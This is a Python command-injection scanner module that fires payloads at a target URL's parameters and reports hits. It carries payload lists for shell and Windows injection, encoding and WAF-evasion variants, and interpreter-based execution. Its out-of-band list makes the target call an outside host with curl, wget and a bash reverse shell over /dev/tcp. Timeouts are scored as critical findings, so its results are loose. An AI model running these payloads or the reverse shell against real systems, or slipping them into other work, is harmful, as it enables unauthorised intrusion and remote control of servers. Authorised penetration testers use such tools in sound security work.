"""Deep command injection detection — encoding bypass, OOB, time-based blind, nested commands, WAF evasion."""

import httpx
import urllib.parse
import re
import time
import asyncio

BUDGET_SECONDS = 20

# --- Basic Command Injection Payloads ---
BASIC_PAYLOADS = [
    ("semicolon", "; id", "uid=", "Linux basic"),
    ("pipe", "| id", "uid=", "Linux pipe"),
    ("or", "|| id", "uid=", "Linux OR"),
    ("and", "&& id", "uid=", "Linux AND"),
    ("subshell", "$(id)", "uid=", "Bash subshell"),
    ("backtick", "`id`", "uid=", "Backtick subshell"),
    ("newline", "%0Aid", "uid=", "Newline injection"),
    ("carriage_return", "%0D%0Aid", "uid=", "CRLF injection"),
    ("tab_bypass", "%09id", "uid=", "Tab encoding"),
    ("space_tab", "%20%09id", "uid=", "Space-tab bypass"),
]

# --- Windows Payloads ---
WINDOWS_PAYLOADS = [
    ("win_ampersand", "& whoami", "", "Windows AND"),
    ("win_pipe", "| whoami", "", "Windows pipe"),
    ("win_newline", "%0Awhoami", "", "Windows newline"),
    ("win_double_amp", "&& whoami", "", "Windows double AND"),
    ("win_cmd_pipe", "cmd|whoami", "", "Windows cmd pipe"),
]

# --- Encoding Bypass ---
ENCODE_PAYLOADS = [
    ("url_encode", ";%20id", "uid=", "URL encoded space"),
    ("double_url", "%3B%20id", "uid=", "Double URL encode semicolon"),
    ("unicode_semicolon", "%EF%BC%9Bid", "uid=", "Unicode fullwidth semicolon"),
    ("unicode_pipe", "%E2%94%82id", "uid=", "Unicode box drawing pipe"),
    ("backslash_bypass", "\\x3Bid", "uid=", "Hex escape semicolon"),
    ("octal_bypass", "\\143id", "uid=", "Octal escape"),
    ("space_substitute", "${IFS}id", "uid=", "Bash IFS substitution"),
    ("space_substitute2", "{id}", "uid=", "Brace expansion"),
    ("comment_bypass", "id%00", "uid=", "Null byte comment"),
    ("wildcard_bypass", ";/??/??/id", "uid=", "Wildcard bypass /usr/bin/id"),
]

# --- Nested/Chained Payloads ---
NESTED_PAYLOADS = [
    ("nested_1", "';id;'", "uid=", "Single quote escape"),
    ("nested_2", "\";id;\"", "uid=", "Double quote escape"),
    ("nested_3", "$(';id;')", "uid=", "PHP exec"),
    ("nested_4", "system('id')", "uid=", "PHP system()"),
    ("nested_5", "exec('id')", "uid=", "PHP exec()"),
    ("nested_6", "`id`", "uid=", "PHP backtick"),
    ("nested_7", ";{id}", "uid=", "Brace injection"),
    ("nested_8", "|{id}", "uid=", "Pipe brace"),
    ("nested_9", "$(id;id)", "uid=", "Nested subshell"),
    ("nested_10", "`id`", "uid=", "Nested backtick"),
    ("nested_11", ";echo $(id)", "uid=", "Echo subshell"),
    ("nested_12", ";python3 -c 'import os;os.system(\"id\")'", "uid=", "Python exec"),
    ("nested_13", ";perl -e 'print `id`'", "uid=", "Perl exec"),
    ("nested_14", ";ruby -e 'puts `id`'", "uid=", "Ruby exec"),
    ("nested_15", ";lua -e 'print(io.popen(\"id\"):read())'", "uid=", "Lua exec"),
    ("nested_16", ";node -e 'require(\"child_process\").execSync(\"id\")'", "uid=", "Node.js exec"),
]

# --- Time-Based Blind ---
TIME_PAYLOADS = [
    ("time_sleep", "; sleep 5", 5, "Linux sleep"),
    ("time_sleep_10", "; sleep 10", 10, "Linux sleep 10"),
    ("time_timeout_win", "& timeout /t 5 /nobreak", 5, "Windows timeout"),
    ("time_ping", "; ping -c 5 127.0.0.1", 5, "Linux ping delay"),
    ("time_bash_sleep", "| bash -c 'sleep 5'", 5, "Bash sleep"),
    ("time_perl_sleep", "; perl -e 'select(undef,undef,undef,5)'", 5, "Perl sleep"),
    ("time_python_sleep", "; python3 -c 'import time;time.sleep(5)'", 5, "Python sleep"),
    ("time_php_sleep", "; php -r 'sleep(5);'", 5, "PHP sleep"),
]

# --- OOB/Blind Verification ---
OOB_PAYLOADS = [
    ("oob_curl", "; curl http://{oob}/oob_{marker}", "oob_{marker}", "Curl OOB"),
    ("oob_wget", "; wget http://{oob}/oob_{marker}", "oob_{marker}", "Wget OOB"),
    ("oob_ping", "; ping -c 1 {oob}", "", "Ping OOB"),
    ("oob_dns", "; nslookup {oob}", "", "DNS OOB"),
    ("oob_python", "; python3 -c 'import urllib.request;urllib.request.urlopen(\"http://{oob}/oob_{marker}\")'", "", "Python OOB"),
    ("oob_node", "; node -e 'require(\"http\").get(\"http://{oob}/oob_{marker}\")'", "", "Node OOB"),
    ("oob_bash", "; bash -i >& /dev/tcp/{oob}/80 0>&1", "", "Reverse shell OOB"),
]

# --- WAF Bypass Variants ---
def _generate_bypasses(payload: str) -> list[str]:
    """Generate WAF evasion variants for a command injection payload."""
    variants = []

    # Case variation
    variants.append(payload.replace("id", "Id"))
    variants.append(payload.replace("id", "ID"))

    # Double encoding
    double_encoded = urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
    variants.append(double_encoded)

    # Null byte injection
    variants.append(payload.replace(";", ";%00"))
    variants.append(payload.replace("|", "%00|"))
    variants.append(payload.replace("&", "%00&"))

    # Space alternatives
    variants.append(payload.replace(" ", "$IFS"))
    variants.append(payload.replace(" ", "%20%09%20"))

    # Comment insertion
    variants.append(payload.replace(";", ";#"))
    variants.append(payload.replace(";", ";#;"))

    # Backslash escape
    variants.append(payload.replace(";", "\\;"))
    variants.append(payload.replace("|", "\\|"))

    # Brace expansion
    if "id" in payload:
        variants.append(payload.replace("id", "{i,d}"))
        variants.append(payload.replace("id", "{i}{d}"))

    # Variable substitution
    if "id" in payload:
        variants.append(payload.replace("id", "$'\\x69\\x64'"))

    # Newline injection
    variants.append(payload.replace(";", "%0a"))
    variants.append(payload.replace(";", "%0d%0a"))

    # Multiple semicolons
    variants.append(payload.replace(";", ";;"))
    variants.append(payload.replace(";", ";;;"))

    # Alternatives to semicolon
    variants.append(payload.replace(";", "|"))
    variants.append(payload.replace(";", "||"))
    variants.append(payload.replace(";", "&&"))
    variants.append(payload.replace(";", "`"))
    variants.append(payload.replace(";", "$(echo;)"))

    # URL encoding variants
    variants.append(payload.replace(";", "%3b"))
    variants.append(payload.replace("|", "%7c"))
    variants.append(payload.replace("&", "%26"))

    return list(set(variants))


def _extract_evidence(body: str, indicator: str) -> str:
    """Extract evidence snippet around indicator match."""
    idx = body.find(indicator)
    if idx == -1:
        return ""
    start = max(0, idx - 80)
    end = min(len(body), idx + 120)
    return body[start:end]


async def cmd_injection(target: str, param: str = "", oob_domain: str = "") -> dict:
    deadline = time.monotonic() + BUDGET_SECONDS
    budget_exhausted = False
    _left = lambda: max(0.05, deadline - time.monotonic())
    """Deep command injection detection with encoding bypass, OOB, time-based blind, nested commands."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    parsed = urllib.parse.urlparse(target)
    params = urllib.parse.parse_qs(parsed.query)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    test_params = [param] if param else list(params.keys()) if params else [
        "cmd", "exec", "command", "query", "ping", "host", "file",
        "path", "dir", "url", "input", "data", "name", "user",
        "search", "test", "debug", "system", "run", "eval",
    ]

    results = []
    oob_hits = []
    oob_marker = f"cmd_oob_{int(time.time())}"
    oob_url = f"http://{oob_domain}/{oob_marker}" if oob_domain else ""
    baseline_size = 0

    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=False) as client:
        # Baseline
        try:
            baseline_resp = await client.get(base)
            baseline_size = len(baseline_resp.text)
        except Exception:
            pass

        for p in test_params:
            if time.monotonic() >= deadline:
                budget_exhausted = True
                break
            # --- Basic Payloads ---
            for name, payload, indicator, description in BASIC_PAYLOADS + WINDOWS_PAYLOADS:
                try:
                    url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                    resp = await asyncio.wait_for(client.get(url), timeout=_left())
                    body = resp.text
                    found = bool(re.search(indicator, body, re.I)) if indicator else (len(body) > baseline_size + 50)

                    if found:
                        results.append({
                            "technique": "basic_injection",
                            "param": p,
                            "payload": name,
                            "payload_value": payload,
                            "indicator": indicator,
                            "evidence": _extract_evidence(body, indicator) if indicator else body[:200],
                            "description": description,
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "confirmed",
                        })
                        break  # Found vulnerability on this param, skip to next
                except Exception:
                    continue

            # --- Encoding Bypass ---
            if not any(r["param"] == p and r.get("risk") == "CRITICAL" for r in results):
                for name, payload, indicator, description in ENCODE_PAYLOADS:
                    try:
                        url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                        resp = await asyncio.wait_for(client.get(url), timeout=_left())
                        body = resp.text
                        found = bool(re.search(indicator, body, re.I)) if indicator else False

                        if found:
                            results.append({
                                "technique": "encoding_bypass",
                                "param": p,
                                "payload": name,
                                "payload_value": payload,
                                "indicator": indicator,
                                "evidence": _extract_evidence(body, indicator),
                                "description": description,
                                "status": resp.status_code,
                                "risk": "CRITICAL",
                                "confidence": "high",
                            })
                            break
                    except Exception:
                        continue

            # --- Nested/Chained ---
            if not any(r["param"] == p and r.get("risk") == "CRITICAL" for r in results):
                for name, payload, indicator, description in NESTED_PAYLOADS:
                    try:
                        url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                        resp = await asyncio.wait_for(client.get(url), timeout=_left())
                        body = resp.text
                        found = bool(re.search(indicator, body, re.I)) if indicator else False

                        if found:
                            results.append({
                                "technique": "nested_injection",
                                "param": p,
                                "payload": name,
                                "payload_value": payload,
                                "indicator": indicator,
                                "evidence": _extract_evidence(body, indicator),
                                "description": description,
                                "status": resp.status_code,
                                "risk": "CRITICAL",
                                "confidence": "high",
                            })
                            break
                    except Exception:
                        continue

            # --- Time-Based Blind ---
            for name, payload, expected_delay, description in TIME_PAYLOADS:
                if time.monotonic() + 6 >= deadline:
                    break
                try:
                    url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                    start_time = time.time()
                    resp = await asyncio.wait_for(client.get(url), timeout=_left())
                    elapsed = time.time() - start_time

                    if elapsed >= expected_delay - 1:
                        results.append({
                            "technique": "time_based_blind",
                            "param": p,
                            "payload": name,
                            "payload_value": payload,
                            "elapsed_seconds": round(elapsed, 2),
                            "expected_delay": expected_delay,
                            "description": description,
                            "status": resp.status_code,
                            "risk": "CRITICAL",
                            "confidence": "confirmed" if elapsed >= expected_delay else "probable",
                        })
                except httpx.TimeoutException:
                    results.append({
                        "technique": "time_based_blind",
                        "param": p,
                        "payload": name,
                        "payload_value": payload,
                        "elapsed_seconds": "TIMEOUT",
                        "expected_delay": expected_delay,
                        "description": description,
                        "risk": "CRITICAL",
                        "confidence": "high",
                    })
                except Exception:
                    continue

            # --- OOB/Blind ---
            if oob_domain:
                for name, payload_template, marker, description in OOB_PAYLOADS:
                    try:
                        payload = payload_template.replace("{oob}", oob_domain).replace("{marker}", oob_marker)
                        url = f"{base}?{p}={urllib.parse.quote(payload, safe='')}"
                        resp = await asyncio.wait_for(client.get(url), timeout=_left())

                        if marker and marker in resp.text:
                            oob_hits.append({
                                "technique": "oob_blind",
                                "param": p,
                                "payload": name,
                                "marker": marker,
                                "description": description,
                                "status": resp.status_code,
                                "risk": "CRITICAL",
                                "confidence": "confirmed",
                            })
                            break
                    except Exception:
                        continue

            # --- WAF Bypass Testing ---
            if not any(r["param"] == p and r.get("risk") in ("CRITICAL", "HIGH") for r in results):
                for name, payload, indicator, description in BASIC_PAYLOADS[:3]:
                    for variant in _generate_bypasses(payload)[:5]:
                        try:
                            url = f"{base}?{p}={urllib.parse.quote(variant, safe='')}"
                            resp = await asyncio.wait_for(client.get(url), timeout=_left())
                            body = resp.text
                            found = bool(re.search(indicator, body, re.I)) if indicator else False

                            if found:
                                results.append({
                                    "technique": "waf_bypass",
                                    "param": p,
                                    "payload": name,
                                    "original": payload,
                                    "bypass_payload": variant[:100],
                                    "indicator": indicator,
                                    "evidence": _extract_evidence(body, indicator),
                                    "description": "WAF bypass variant successful",
                                    "status": resp.status_code,
                                    "risk": "HIGH",
                                    "confidence": "high",
                                })
                                break
                        except Exception:
                            continue
                    if any(r["param"] == p and r.get("technique") == "waf_bypass" for r in results):
                        break

    return {
        "target": target,
        "params_tested": test_params,
        "results": results,
        "oob_hits": oob_hits,
        "vulnerable": len(results) > 0 or len(oob_hits) > 0,
        "total_findings": len(results) + len(oob_hits),
        "techniques_found": list(set(r["technique"] for r in results + oob_hits)),
        "budget_seconds": BUDGET_SECONDS,
        "budget_exhausted": budget_exhausted,
        "risk_summary": {
            "critical": sum(1 for r in results + oob_hits if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in results + oob_hits if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results + oob_hits if r.get("risk") == "MEDIUM"),
        },
    }
